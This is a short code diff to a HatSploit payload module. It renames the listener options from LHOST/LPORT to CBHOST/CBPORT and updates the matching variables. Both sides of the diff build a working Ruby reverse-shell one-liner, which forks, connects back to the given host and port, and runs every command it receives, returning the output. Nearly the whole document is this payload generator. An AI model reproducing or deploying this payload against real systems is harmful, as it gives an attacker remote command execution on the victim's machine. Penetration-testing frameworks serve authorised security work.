@@ -28,14 +28,14 @@ class HatSploitPayload(Payload):
     }
 
     options = {
-        'LHOST': {
-            'Description': "Local host.",
+        'CBHOST': {
+            'Description': "Connect-back host.",
             'Value': TCPClient.get_local_host(),
             'Type': "ip",
             'Required': True
         },
-        'LPORT': {
-            'Description': "Local port.",
+        'CBPORT': {
+            'Description': "Connect-back port.",
             'Value': 8888,
             'Type': "port",
             'Required': True
@@ -43,7 +43,7 @@ class HatSploitPayload(Payload):
     }
 
     def run(self):
-        local_host, local_port = self.parse_options(self.options)
+        connback_host, connback_port = self.parse_options(self.options)
 
-        payload = "ruby -rsocket -e 'exit if fork;c=TCPSocket.new(\"" + local_host + "\",\"" + local_port + "\");while(cmd=c.gets);IO.popen(cmd,\"r\"){|io|c.print io.read}end'"
+        payload = "ruby -rsocket -e 'exit if fork;c=TCPSocket.new(\"" + connback_host + "\",\"" + connback_port + "\");while(cmd=c.gets);IO.popen(cmd,\"r\"){|io|c.print io.read}end'"
         return payload
